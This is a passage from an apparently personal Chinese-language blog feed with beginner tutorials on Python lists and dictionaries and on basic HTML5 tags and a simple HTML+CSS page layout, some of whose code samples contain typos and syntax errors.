class="comment">#直接使用索引进行查询操作</span></span><br></pre></td></tr></table></figure><h4 id="E、升序和降序排列"><a href="#E、升序和降序排列" class="headerlink" title="E、升序和降序排列"></a>E、升序和降序排列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="number">222</span>,<span class="number">156</span>,<span class="number">84</span>,<span class="number">1569</span>,<span class="number">12</span>,<span class="number">447</span>]</span><br><span class="line">lst.sort()          <span class="comment">#升序排列</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line">lst = [<span class="number">222</span>,<span class="number">156</span>,<span class="number">84</span>,<span class="number">1569</span>,<span class="number">12</span>,<span class="number">447</span>]</span><br><span class="line">lst.sort(reverse=<span class="literal">True</span>)          <span class="comment">#降序排列</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h3 id="3、列表的嵌套"><a href="#3、列表的嵌套" class="headerlink" title="3、列表的嵌套"></a>3、列表的嵌套</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;azj&quot;</span>,<span class="string">&quot;sdf&quot;</span>,[<span class="string">&quot;呵呵哒&quot;</span>,<span class="string">&quot;妈妈咪呀&quot;</span>,<span class="string">&quot;kuku&quot;</span>,[<span class="string">&quot;可乐&quot;</span>,<span class="string">&quot;scrapy&quot;</span>,<span class="number">123</span>]],<span class="string">&quot;fgh&quot;</span>,<span class="string">&quot;poi&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(lst[<span class="number">2</span>][<span class="number">3</span>][<span class="number">1</span>])</span><br><span class="line">lst[<span class="number">2</span>][<span class="number">3</span>][<span class="number">1</span>] = lst[<span class="number">2</span>][<span class="number">3</span>][<span class="number">1</span>].upper</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h1 id="八、字典"><a href="#八、字典" class="headerlink" title="八、字典"></a>八、字典</h1><h3 id="1、定义-1"><a href="#1、定义-1" class="headerlink" title="1、定义"></a>1、定义</h3><p><strong>首先，字典是以键值对的形式进行存储数据的</strong><br><strong>字典的表示方式: {key:value, key2:value, key3:value}</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123; <span class="string">&quot;jay&quot;</span>: <span class="string">&quot;周杰伦&quot;</span>,<span class="string">&quot;金毛狮王&quot;</span>: <span class="string">&quot;谢逊&quot;</span> &#125;</span><br><span class="line">val = dic[<span class="string">&quot;金毛狮王&quot;</span>] <span class="comment">#用起来只是把索引换成了key</span></span><br><span class="line"><span class="built_in">print</span>(val)</span><br></pre></td></tr></table></figure><p><strong>字典的key必须是可哈希的数据类型</strong><br><strong>字典的value可以是任何数据类型</strong></p><p><strong>不可哈希: python中的set集合进行数据存储的时候，需要对数据进行哈希计算，根据计算出来的哈希值进行存储数据</strong><br><strong>set集合要求存储的数据必须是可以进行哈希计算的。</strong><br><strong>可变的数据类型，list, dict, set</strong></p><p><strong>可哈希:不可变的数据类型，int, str, tuple, bool.</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123; <span class="string">&quot;jay&quot;</span>: <span class="string">&quot;周杰伦&quot;</span>,<span class="string">&quot;金毛狮王&quot;</span>: <span class="string">&quot;谢逊&quot;</span> &#125;</span><br><span class="line">dic. setdefault(<span class="string">&quot;jay&quot;</span>, <span class="string">&quot;胡辣汤&quot;</span>)   <span class="comment"># 设置默认值。如果以前已经有了tom了. setdefault就不起作用了</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><h3 id="2、删除"><a href="#2、删除" class="headerlink" title="2、删除"></a>2、删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123; <span class="string">&quot;jay&quot;</span>: <span class="string">&quot;周杰伦&quot;</span>,<span class="string">&quot;金毛狮王&quot;</span>: <span class="string">&quot;谢逊&quot;</span> &#125;</span><br><span class="line">dic.pop(<span class="string">&quot;jay&quot;</span>)    <span class="comment"># 根据key去删除</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line">dic=&#123;</span><br><span class="line"><span class="string">&quot;赵四&quot;</span>: <span class="string">&quot;特别能歪嘴&quot;</span>,</span><br><span class="line"><span class="string">&quot;刘能&quot;</span>: <span class="string">&quot;老，老四啊...&quot;</span>,</span><br><span class="line"><span class="string">&quot;大脚&quot;</span>:<span class="string">&quot;跟这个和那个搞对象&quot;</span>,</span><br><span class="line"><span class="string">&quot;大脑袋&quot;</span>: <span class="string">&quot;瞎折腾....&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">temp = [] <span class="comment"># 存放即将要删除的key</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">if</span> key.startswith(<span class="string">&quot;大&quot;</span>):</span><br><span class="line">        temp. append(key)</span><br><span class="line"><span class="comment"># dic. pop(key) # dictionary changed size during iterat ion</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> temp:    <span class="comment">#循环列表，删除字典中的内容</span></span><br><span class="line">    dic. pop(t) </span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure><h3 id="3、查询"><a href="#3、查询" class="headerlink" title="3、查询"></a>3、查询</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123; <span class="string">&quot;jay&quot;</span>: <span class="string">&quot;周杰伦&quot;</span>,<span class="string">&quot;金毛狮王&quot;</span>: <span class="string">&quot;谢逊&quot;</span> &#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&quot;jay&quot;</span>]) <span class="comment">#如果key不存在。程序会报错。当你确定你的key是没问题的，可以用</span></span><br><span class="line">dic = &#123; <span class="string">&quot;jay&quot;</span>: <span class="string">&quot;周杰伦&quot;</span>,<span class="string">&quot;金毛狮王&quot;</span>: <span class="string">&quot;谢逊&quot;</span> &#125;</span><br><span class="line"><span class="built_in">print</span>(dic.get(<span class="string">&quot;jay10086&quot;</span>)) <span class="comment">#如果key不存在。程序返回None. 当不确定你的key的时候，可以用</span></span><br></pre></td></tr></table></figure><h5 id="3-1None"><a href="#3-1None" class="headerlink" title="3.1None"></a>3.1None</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="literal">None</span>     <span class="comment">#单纯的就是空，表示没有的意思</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure><p><strong>例子：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dic=&#123;</span><br><span class="line"><span class="string">&quot;赵四&quot;</span>: <span class="string">&quot;特别能歪嘴&quot;</span>,</span><br><span class="line"><span class="string">&quot;刘能&quot;</span>: <span class="string">&quot;老，老四啊...&quot;</span>,</span><br><span class="line"><span class="string">&quot;大脚&quot;</span>:<span class="string">&quot;跟这个和那个搞对象&quot;</span>,</span><br><span class="line"><span class="string">&quot;大脑袋&quot;</span>: <span class="string">&quot;瞎折腾....&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">name = <span class="built_in">input</span> (<span class="string">&quot;请输入你想知道的我们村的人的名字: &quot;</span>)</span><br><span class="line">val=dic.get(name)</span><br><span class="line"><span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> :</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我们村没这个人&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> (val)</span><br></pre></td></tr></table></figure><h5 id="3-2-可以用for循环，直接拿到key"><a href="#3-2-可以用for循环，直接拿到key" class="headerlink" title="3.2 可以用for循环，直接拿到key"></a>3.2 可以用for循环，直接拿到key</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line"><span class="built_in">print</span>(key, dic[key])</span><br></pre></td></tr></table></figure><h5 id="3-3希望把所有的key全都保存在一个列表中"><a href="#3-3希望把所有的key全都保存在一个列表中" class="headerlink" title="3.3希望把所有的key全都保存在一个列表中"></a>3.3希望把所有的key全都保存在一个列表中</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(dic.keys())) <span class="comment"># 拿到所有的key了</span></span><br></pre></td></tr></table></figure><h5 id="3-4希望吧所有的value都放在一个列表中"><a href="#3-4希望吧所有的value都放在一个列表中" class="headerlink" title="3.4希望吧所有的value都放在一个列表中"></a>3.4希望吧所有的value都放在一个列表中</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line"><span class="built_in">print</span> (dic. values())</span><br></pre></td></tr></table></figure><h5 id="3-5直接拿到字典中的key和value"><a href="#3-5直接拿到字典中的key和value" class="headerlink" title="3.5直接拿到字典中的key和value"></a>3.5直接拿到字典中的key和value</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>( <span class="built_in">list</span>(dic. items()))</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> dic. items( ):      <span class="comment">#可以直接拿到字典的所有的key和valueI</span></span><br><span class="line"><span class="comment">#print(item) # 确定，item中只有 两项元素</span></span><br><span class="line"><span class="built_in">print</span>（key，value）</span><br></pre></td></tr></table></figure><h4 id="4、字典的嵌套"><a href="#4、字典的嵌套" class="headerlink" title="4、字典的嵌套"></a>4、字典的嵌套</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">wangfeng = &#123;</span><br><span class="line">    name<span class="string">&quot; :&quot;</span>汪峰<span class="string">&quot;，</span></span><br><span class="line"><span class="string">     age&quot;</span>:<span class="number">18</span></span><br><span class="line">          <span class="string">&quot;wife&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;name&quot;</span>: <span class="string">&quot;章子怡&quot;</span> ,</span><br><span class="line">          <span class="string">&quot;hobby&quot;</span> :<span class="string">&quot;演戏&quot;</span>，</span><br><span class="line">              <span class="string">&quot;assistant&quot;</span>: &#123;</span><br><span class="line">                   <span class="string">&quot;name&quot;</span>:<span class="string">&quot;樵夫&quot;</span></span><br><span class="line">                   <span class="string">&quot;age&quot;</span>: <span class="number">19</span> ,</span><br><span class="line">                   <span class="string">&quot;hobby&quot;</span>: <span class="string">&quot;打游戏&quot;</span></span><br><span class="line">                           &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">         <span class="string">&quot;children&quot;</span>: [</span><br><span class="line">             &#123;<span class="string">&quot;name&quot;</span> :<span class="string">&quot;孩儿1&quot;</span>,</span><br><span class="line">                     <span class="string">&#x27;age&quot;: 13&#125;,</span></span><br><span class="line"><span class="string">             &#123;&quot;name&quot; :&quot;孩儿2&quot;</span></span><br><span class="line"><span class="string">                   &quot;age&quot;: 10&#125; ,</span></span><br><span class="line"><span class="string">                      ]</span></span><br><span class="line"><span class="string">               &#125;</span></span><br><span class="line"><span class="string">#汪峰妻子的助手的名字</span></span><br><span class="line"><span class="string">name = wangfeng [ &#x27;</span>wife<span class="string">&#x27; ] [ assistant&#x27;</span> ][ <span class="string">&#x27; name&#x27;</span> ]</span><br><span class="line">pr <span class="built_in">int</span> (name )</span><br><span class="line"><span class="comment">#给汪峰的第二个孩子加1岁</span></span><br><span class="line">wangfeng[<span class="string">&#x27; children&#x27;</span> ][<span class="number">1</span>][<span class="string">&#x27;age&#x27;</span>] = wangfeng[ <span class="string">&#x27;children&#x27;</span> ][<span class="number">1</span>][<span class="string">&#x27;age&#x27;</span>] + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> (wangfeng)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-注释&quot;&gt;&lt;a href=&quot;#一-注释&quot; class=&quot;headerlink&quot; title=&quot;一.注释&quot;&gt;&lt;/a&gt;一.注释&lt;/h1&gt;&lt;p&gt;**一.注释&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#（单行注释）&lt;/strong&gt;（快捷键：CTRL+&amp;#x2F;)&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>12.6(HTML5基础以及简单使用）</title>
    <link href="http://example.com/2023/12/06/12.6(HTML5%E5%9F%BA%E7%A1%80%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%89/"/>
    <id>http://example.com/2023/12/06/12.6(HTML5%E5%9F%BA%E7%A1%80%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%89/</id>
    <published>2023-12-06T13:09:03.471Z</published>
    <updated>2023-12-09T07:17:28.158Z</updated>
    
    <content type="html"><![CDATA[<ol><li><h1 id="HTML5基础："><a href="#HTML5基础：" class="headerlink" title="HTML5基础："></a>HTML5基础：</h1></li></ol><h2 id="在VS-code中添加拓展，如图所示。"><a href="#在VS-code中添加拓展，如图所示。" class="headerlink" title="在VS code中添加拓展，如图所示。"></a>在VS code中添加拓展，如图所示。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206141103862.png" alt="image-20231206141103862"></p><h2 id="创建一个html文件以便于对html有一个简单的认识。"><a href="#创建一个html文件以便于对html有一个简单的认识。" class="headerlink" title="创建一个html文件以便于对html有一个简单的认识。"></a>创建一个html文件以便于对html有一个简单的认识。</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206141148150.png" alt="image-20231206141148150"></p><h2 id="进入输入指令”-TAB”则会自动输出基本的框架"><a href="#进入输入指令”-TAB”则会自动输出基本的框架" class="headerlink" title="进入输入指令”!+TAB”则会自动输出基本的框架"></a>进入输入指令”!+TAB”则会自动输出基本的框架</h2><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206141423506.png" alt="image-20231206141423506"></p><h2 id="HTML的基本语法："><a href="#HTML的基本语法：" class="headerlink" title="HTML的基本语法："></a>HTML的基本语法：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>:加粗<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>:斜体<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span>上标<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span>   <span class="comment">&lt;!----换行--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>:加粗<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sub</span>&gt;</span>下标<span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span> /&gt;</span><span class="comment">&lt;!----分割线--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>加粗<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="comment">&lt;!----注释--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">em</span>&gt;</span>斜体<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>最大标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h6</span>&gt;</span>最小标题<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s</span>&gt;</span>文字中划线<span class="tag">&lt;/<span class="name">s</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">del</span>&gt;</span>文字中划线<span class="tag">&lt;/<span class="name">del</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span>&gt;</span>google <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> &gt;</span><span class="comment">&lt;!----列表--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!----行--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!----列--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HTML使用标签-来设置超文本链接："><a href="#HTML使用标签-来设置超文本链接：" class="headerlink" title="HTML使用标签 &lt;a&gt;来设置超文本链接："></a>HTML使用标签 <code>&lt;a&gt;</code>来设置超文本链接：</h2><blockquote><ul><li><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。当你把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p></li><li><p>在标签 <code>&lt;a&gt; </code>中使用了 <strong>href</strong> 属性来描述链接的地址。在链接之后的文本则是作为链接的显示文本。例如以上则显示为下图所示。</p></li><li><p><strong>注意：</strong><code>&lt;a&gt; </code>标签中必须提供 href 属性或 name 属性。</p></li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.google.com&quot;</span>&gt;</span>google <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206144739679.png" alt="image-20231206144739679"></p><h2 id="HTML图像：在-HTML-中，图像由-标签定义。"><a href="#HTML图像：在-HTML-中，图像由-标签定义。" class="headerlink" title="HTML图像：在 HTML 中，图像由&lt;img&gt; 标签定义。"></a>HTML图像：在 HTML 中，图像由<code>&lt;img&gt; </code>标签定义。</h2><blockquote><ul><li><code>&lt;img&gt; </code>是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>要在页面上显示图像，你需要使用源属性（src）。src 指 “source”。源属性的值是图像的 URL 地址。</li><li>URL 指存储图像的位置。如果名为 “1.jpg” 的图像位于文件夹的  目录中，那么其 URL 为 “.&#x2F;1.jpg”</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206193212841.png" alt="image-20231206193212841"></p><p><strong>定义图像的语法是：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;url&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;some_text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><h1 id="用html-css写一个页面"><a href="#用html-css写一个页面" class="headerlink" title="用html+css写一个页面"></a>用html+css写一个页面</h1></li></ol><p>整体界面如下</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206210204737.png" alt="image-20231206210204737"></p><p>代码解释：</p><h2 id="HTML-部分："><a href="#HTML-部分：" class="headerlink" title="HTML 部分："></a>HTML 部分：</h2><blockquote><p><code>&lt;!DOCTYPE html&gt;</code>：这是文档类型声明，指定文档使用 HTML5 标准。<br><code>&lt;html lang=&quot;en&quot;&gt;</code>：HTML 文档的根元素，<code>lang=&quot;en&quot;</code> 属性定义页面语言为英语。<br><code>&lt;head&gt;</code>：头部部分包含关于文档的元信息。<br> <code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置文档使用 UTF-8 字符编码，确保能正确显示各种字符。<br> <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：配置视口，确保适应移动设备的屏幕。<br> <code>&lt;title&gt;web2302&lt;/title&gt;</code>：定义页面标题为 “web2302”。<br> <code>&lt;style&gt;</code>：内联样式表，包含了对页面样式的定义。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>web2302<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="在-标签内："><a href="#在-标签内：" class="headerlink" title="在 &lt;style&gt; 标签内："></a>在 <code>&lt;style&gt;</code> 标签内：</h2><h3 id="body-规则：设置整个页面的样式。"><a href="#body-规则：设置整个页面的样式。" class="headerlink" title="body 规则：设置整个页面的样式。"></a><code>body</code> 规则：设置整个页面的样式。</h3><blockquote><p> <code>margin: 0;</code> 和 <code>padding: 0;</code>：消除页面的外边距和内边距，确保内容紧贴边框。</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206203311432.png" alt="image-20231206203311432"></p><h3 id="container-规则：定义页面容器的样式。"><a href="#container-规则：定义页面容器的样式。" class="headerlink" title="#container 规则：定义页面容器的样式。"></a><code>#container</code> 规则：定义页面容器的样式。</h3><blockquote><p><code>width: 500px;</code>：设置容器宽度为 500 像素。<br><code>margin:0 auto;</code>：通过设置左右外边距为自动，使容器水平居中。</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206202650444.png" alt="image-20231206202650444"></p><h3 id="header-规则：定义页头的样式。"><a href="#header-规则：定义页头的样式。" class="headerlink" title="#header 规则：定义页头的样式。"></a><code>#header</code> 规则：定义页头的样式。</h3><blockquote><p><code>background-color: #FFA500;</code>：设置背景颜色为橙色。<br><code>color: #fff;</code>：设置文字颜色为白色。<br><code>padding: 10px;</code>：设置内边距为 10 像素。<br><code>text-align: center;</code>：文字居中。</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206204950751.png" alt="image-20231206204950751"></p><h3 id="menu-规则：定义菜单的样式。"><a href="#menu-规则：定义菜单的样式。" class="headerlink" title="#menu 规则：定义菜单的样式。"></a><code>#menu</code> 规则：定义菜单的样式。</h3><blockquote><p><code>background-color: #FFD700;</code>：设置背景颜色为金色。<br><code>height:100px;</code>：设置高度为 100 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素。</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206205941309.png" alt="image-20231206205941309"></p><h3 id="content-规则：定义内容区域的样式。"><a href="#content-规则：定义内容区域的样式。" class="headerlink" title="#content 规则：定义内容区域的样式。"></a><code>#content</code> 规则：定义内容区域的样式。</h3><blockquote><p><code>background-color: #EEEEEE;</code>：设置背景颜色为淡灰色。<br><code>height:100px;</code>：设置高度为 100 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素。</p></blockquote><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231206210352894.png" alt="image-20231206210352894"></p><h3 id="ll-和-ll1-规则：定义内容区域内两个子元素的样式。"><a href="#ll-和-ll1-规则：定义内容区域内两个子元素的样式。" class="headerlink" title="#ll 和 #ll1 规则：定义内容区域内两个子元素的样式。"></a><code>#ll</code> 和 <code>#ll1</code> 规则：定义内容区域内两个子元素的样式。</h3><blockquote><p><code>background-color: #a74949;</code> 和 <code>background-color: #49a781;</code>：设置不同的背景颜色。<br><code>height:50px;</code>：设置高度为 50 像素。<br><code>width: 500px;</code>：设置宽度为 500 像素。</p></blockquote><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206210504053.png" alt="image-20231206210504053"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206210556032.png" alt="image-20231206210556032"></p><h3 id="footer-规则：定义页脚的样式。"><a href="#footer-规则：定义页脚的样式。" class="headerlink" title="#footer 规则：定义页脚的样式。"></a><code>#footer</code> 规则：定义页脚的样式。</h3><blockquote><p><code>background-color: #FFA500;</code>：设置背景颜色为橙色。<br><code>color: #fff;</code>：设置文字颜色为白色。<br><code>clear: both;</code>：清除两侧浮动元素影响，确保页脚位于容器底部。<br><code>text-align: center;</code>：文字居中。<br><code>padding: 10px;</code>：设置内边距为 10 像素。</p></blockquote><ul><li><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231206210702902.png" alt="image-20231206210702902"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
